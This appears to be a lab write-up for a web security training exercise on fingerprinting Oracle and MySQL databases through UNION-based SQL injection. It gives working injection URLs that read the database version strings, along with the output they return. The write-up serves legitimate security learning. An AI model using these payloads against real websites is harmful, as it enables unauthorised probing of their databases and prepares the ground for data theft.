<h1>Examining the database in SQL injection attacks</h1>

Following the identification of an SQL injection vulnerability, it is generally useful to obtain more information about the database. We can, for example, query the version details for the database. This process depends on the database type, so its crucial that we find out first the type of database we are attacking.

For example, to query the version details on Oracle we can execute:

```
 SELECT * FROM v$version 
```

To determine what database tables exist and which columns they contain, we can execute the following query on most databases:

```
 SELECT * FROM information_schema.tables 
```

## Querying the database type and version

![1](https://user-images.githubusercontent.com/57036558/76876056-4b282b80-6869-11ea-8f4b-e2a4dca5f86f.png)

To solve this lab we need to execute an SQL injection UNION attack to display the database version string.

It is specified that the lab is built on an ORACLE database. On Oracle databases, every SELECT statement must specify a table to select FROM and that there is a built-in table on Oracle called DUAL which we can use for this purpose.

So to retreive the number of columns, we use the same method as in the other labs (using `' UNION SELECT NULL`) but we need to select the `DUAL` table:

```
https://web-security-academy.net/filter?category=Pets%27+UNION+SELECT+null,null+FROM+DUAL--
```

After finding out that the database has two columns, we need to find out which columns display data. After finding out that both columns display data, we can proceed into finding the version of the database:

```
https://web-security-academy.net/filter?category=Pets%27+UNION+SELECT+BANNER,null+FROM+v$version--
```

Which will display all the information about the database and solve the lab:

```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```

![2](https://user-images.githubusercontent.com/57036558/76877206-f71e4680-686a-11ea-9996-445755bf08d3.png)

To solve this lab we need to do the same thing, but instead on MySQL and Microsoft database.

The differences in this lab and the previous one are quite significant. To comment the rest of the query we can't use `--` anymore, and instead we need to use `# `. To get the version of the database we don't need to specify a table like on Oracle databases, and we use `@@version` on a displaying column.

Also, to execute this attack on the browser, we need to encode `#` to `%23` otherwise it won't work.

On the browser:

```
https://web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+@@VERSION,NULL%23
```

Which displays the version of the database and solves the lab:

```
8.0.15
```
